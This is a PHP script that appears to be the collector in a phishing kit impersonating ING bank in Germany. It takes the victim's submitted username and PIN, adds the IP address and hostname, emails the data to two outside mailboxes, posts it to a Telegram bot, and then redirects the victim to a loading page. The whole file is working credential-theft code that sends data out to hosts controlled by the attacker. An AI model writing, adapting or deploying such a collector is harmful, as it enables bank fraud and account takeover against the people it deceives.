<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);
$message .= "[ING-log error]-------------------------\n";
$message .= "User     : ".$_POST['logname']."\n";
$message .= "PIN   : ".$_POST['pass']."\n";
$message .= "[ING-log error]-------------------------\n";
$send = "1an1rzlt@gmail.com , kalimixkalimix@yandex.com";
$subject = "DON[ING-Deutsh] $ip";
$headers = "From: [ING-de]<info@online.net>";
mail($send,$subject,$message,$headers);

function sndTelegram($message){
    $METRI_TOKEN = "<TOKEN_REMOVED>";
    $tokenlink = "https://api.telegram.org/bot" . $METRI_TOKEN;
    $chat_id = "698740712";

    $params=[
        'chat_id'=>$chat_id,
        'text'=>$message,
        ];
        $ch = curl_init($tokenlink . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
}
sndTelegram($message);

header("Location: loading.html");

?>